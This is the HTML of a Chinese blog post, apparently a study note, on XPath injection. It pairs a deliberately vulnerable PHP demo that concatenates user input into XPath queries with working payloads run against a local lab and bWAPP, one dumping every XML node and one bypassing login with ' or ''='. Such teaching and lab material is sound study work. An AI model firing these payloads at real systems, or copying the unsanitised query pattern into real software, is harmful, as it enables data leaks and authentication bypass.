@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="xpath注入,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="了解XPATH注入XPath 是一门在 XML 文档中查找信息的语言。   XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。   也和SQL注入原理类似，都是进行语句拼接，闭合源码中原本中的查询语句，拼接注入其他的XPATH查询语句。   这里需要和SQL注入区分的是 xpath是通过注入特殊的路径表达式，可以看到X">
+<meta name="keywords" content="xpath注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Xpath注入学习">
+<meta property="og:url" content="http://yoursite.com/2019/08/01/xpath注入/index.html">
+<meta property="og:site_name" content="故人梦">
+<meta property="og:description" content="了解XPATH注入XPath 是一门在 XML 文档中查找信息的语言。   XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。   也和SQL注入原理类似，都是进行语句拼接，闭合源码中原本中的查询语句，拼接注入其他的XPATH查询语句。   这里需要和SQL注入区分的是 xpath是通过注入特殊的路径表达式，可以看到X">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://k-ring.github.io/img/xpath1.png">
+<meta property="og:image" content="https://k-ring.github.io/img/xpath2.png">
+<meta property="og:image" content="https://k-ring.github.io/img/xpath3.png">
+<meta property="og:updated_time" content="2019-08-01T08:33:12.041Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Xpath注入学习">
+<meta name="twitter:description" content="了解XPATH注入XPath 是一门在 XML 文档中查找信息的语言。   XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。   也和SQL注入原理类似，都是进行语句拼接，闭合源码中原本中的查询语句，拼接注入其他的XPATH查询语句。   这里需要和SQL注入区分的是 xpath是通过注入特殊的路径表达式，可以看到X">
+<meta name="twitter:image" content="https://k-ring.github.io/img/xpath1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/01/xpath注入/">
+
+
+
+
+
+  <title>Xpath注入学习 | 故人梦</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">故人梦</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">至今朝，忆往昔、</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-modx"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/01/xpath注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="故人梦">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="故人梦">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Xpath注入学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-01T00:00:00+08:00">
+                2019-08-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/xpath注入/" itemprop="url" rel="index">
+                    <span itemprop="name">xpath注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,194 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="了解XPATH注入"><a href="#了解XPATH注入" class="headerlink" title="了解XPATH注入"></a>了解XPATH注入</h3><p>XPath 是一门在 XML 文档中查找信息的语言。  </p>
+<p>XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。  </p>
+<p>也和SQL注入原理类似，都是进行语句拼接，闭合源码中原本中的查询语句，拼接注入其他的XPATH查询语句。  </p>
+<p>这里需要和SQL注入区分的是 <strong>xpath是通过注入特殊的路径表达式，可以看到XML文件中的所有节点的信息，从而达到敏感信息泄露的危害，也可以使用XPATH注入绕过用户认证。</strong> 而不是影响数据库。</p>
+<a id="more"></a>
+<p>部分的XPATH语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/                从根节点选取</span><br><span class="line">//               从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。</span><br><span class="line">@name            选取name属性。</span><br><span class="line">//book           选取所有 book 子元素，而不管它们在文档中的位置。</span><br><span class="line">bookstore/book   选取属于 bookstore 的子元素的所有 book 元素。</span><br></pre></td></tr></table></figure></p>
+<h3 id="本地测试Xpath使用"><a href="#本地测试Xpath使用" class="headerlink" title="本地测试Xpath使用"></a>本地测试Xpath使用</h3><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>一个供测试的xml文件，score.xml，其中包含了几个用户的几个学科的分数<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//score.xml</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">num</span>=<span class="string">'1'</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'tom'</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">score</span>&gt;</span>60<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">score</span>&gt;</span>70<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">password</span>&gt;</span>qwer123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'helen'</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">subject</span>&gt;</span> </span><br><span class="line">				<span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">score</span>&gt;</span>24<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">score</span>&gt;</span>34<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">password</span>&gt;</span>woaichishi<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'vk'</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">password</span>&gt;</span>vk123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>查询分数的PHP代码是:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//debug.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'score.xml'</span>))&#123;</span><br><span class="line">	$xml = simplexml_load_file(<span class="string">'score.xml'</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]))&#123;</span><br><span class="line">		$user = $_GET[<span class="string">'user'</span>];</span><br><span class="line">		$en_scr = <span class="string">"//peo[@name='&#123;$user&#125;']/subject[contains(foo, 'english')]/score"</span>;</span><br><span class="line">		$ch_scr = <span class="string">"//peo[@name='&#123;$user&#125;']/subject[contains(foo, 'chinese')]/score"</span>;</span><br><span class="line">		$en_qu = $xml -&gt; xpath($en_scr);</span><br><span class="line">		$ch_qu = $xml -&gt; xpath($ch_scr);</span><br><span class="line">		<span class="keyword">foreach</span> ($en_qu <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			<span class="keyword">echo</span> $user.<span class="string">':&lt;br&gt;english is '</span>.$value;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">foreach</span> ($ch_qu <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.<span class="string">'chinese is '</span>.$value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"only have three user: vk, tom, helen."</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>访问链接：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/debug.php?user=vk</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/xpath1.png" alt>  </p>
+<p>这样就可以查询到相关的信息。<br>在php源码中，最重要的就是这句代码了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$en_scr = &quot;//peo[@name=&apos;&#123;$user&#125;&apos;]/subject[contains(foo, &apos;english&apos;)]/score&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>这也是XPATH查询语句的语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//peo                所有peo节点的子元素</span><br><span class="line">@name = &apos;&#123;$user&#125;&apos;    属性name为$user</span><br><span class="line">/subject[contains(foo, &apos;english&apos;)]   因为有很多subject节点,这里的意思就是：这个subject节点包含foo这个节点，并且foo节点的值为english，用来确定科目</span><br><span class="line">/score               相应这个subject节点下的score节点的值，也就是分数了</span><br></pre></td></tr></table></figure></p>
+<p>这就是在这个XPATH查询过程中涉及到的语句：先确定主节点–&gt;确定其中一个用户–&gt;确定这个用户的其中一个科目–&gt;获取该用户这个科目的分数  </p>
+<h5 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a>XPATH注入</h5><p>在这里，XPATH注入的主要作用就是获取整个xml文件的所有信息，从而造成信息泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">http://127.0.0.1/debug.php?user=vk&apos;] | //* | //*[&apos;</span><br></pre></td></tr></table></figure></p>
+<p>效果：<br><img src="https://k-ring.github.io/img/xpath2.png" alt>  </p>
+<p>在这里的payload的意思：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vk&apos;]   闭合前面</span><br><span class="line">|      表示分别执行，类似于SQL中的union select，这个符号的前后路径都回去查询     </span><br><span class="line">//*    表示匹配所有的节点</span><br><span class="line">|      表示分别执行，类似于SQL中的union select，这个符号的前后路径都回去查询</span><br><span class="line">//*[&apos;  前面的//*是xpath语法必须的，如果没有则会报错，[&apos;则是闭合后面的内容</span><br></pre></td></tr></table></figure></p>
+<p>整个payload结合在xpath语句中就是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//peo[@name='vk'] | //* | //*['']/subject[contains(foo, 'english')]/score</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>1、最后闭合后面的时候必须满足xpath语法规则：//*[‘  </p>
+<p>2、XPATH语法中是没有注释的，不能像SQL语句那样注释后面多余的语句，所以只能采用闭合的方式。  </p>
+<p>3、在黑盒测试当中，并不是所有的查询语句都像这样这么合乎规则，有的会使用函数，那么它的闭合就会不一样，比如在bWAPP当中的例子，它的查询语句是：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $xml-&gt;xpath(<span class="string">"//hero[contains(genre, '$genre')]/movie"</span>);</span><br></pre></td></tr></table></figure>
+<p>我们在闭合的时候就要考虑到contains()这个函数的括号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">http://127.0.0.1/bWAPP/bWAPP/xmli_2.php?genre=action&apos;)] | //* | //*[(&apos;&amp;action=search</span><br></pre></td></tr></table></figure></p>
+<h4 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h4><p>bWAPP中有一个关于login的XPATH注入：<br><img src="https://k-ring.github.io/img/xpath3.png" alt></p>
+<p>它的XPATH查询语句是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $xml-&gt;xpath(<span class="string">"/heroes/hero[login='"</span> . $login . <span class="string">"' and password='"</span> . $password . <span class="string">"']"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这里要绕过它的查询，使用 or 绕过(在xpath语法中是支持or，and的)：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">Login：     <span class="string">' or '</span><span class="string">'='</span></span><br><span class="line">Password：  <span class="string">' or '</span><span class="string">'='</span></span><br><span class="line">结合：/heroes/hero[login=<span class="string">''</span> <span class="keyword">or</span> <span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> password=<span class="string">''</span> <span class="keyword">or</span> <span class="string">''</span>=<span class="string">''</span>]    即绕过</span><br></pre></td></tr></table></figure></p>
+<h3 id="学习参考文章"><a href="#学习参考文章" class="headerlink" title="学习参考文章"></a>学习参考文章</h3><p><a href="https://bbs.ichunqiu.com/thread-19016-1-1.html" target="_blank" rel="noopener">Xpath注入</a><br><a href="http://www.runoob.com/xpath/xpath-syntax.html" target="_blank" rel="noopener">xpath语法-菜鸟教程</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xpath注入/" rel="tag"># xpath注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/01/SQL注入杂记/" rel="next" title="SQL注入杂记">
+                <i class="fa fa-chevron-left"></i> SQL注入杂记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">故人梦</p>
+              <p class="site-description motion-element" itemprop="description">人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#了解XPATH注入"><span class="nav-number">1.</span> <span class="nav-text">了解XPATH注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地测试Xpath使用"><span class="nav-number">2.</span> <span class="nav-text">本地测试Xpath使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息泄露"><span class="nav-number">2.1.</span> <span class="nav-text">信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#XPATH注入"><span class="nav-number">2.1.1.</span> <span class="nav-text">XPATH注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注意"><span class="nav-number">2.2.</span> <span class="nav-text">注意</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#权限绕过"><span class="nav-number">2.3.</span> <span class="nav-text">权限绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#学习参考文章"><span class="nav-number">3.</span> <span class="nav-text">学习参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">故人梦</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">32.3k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
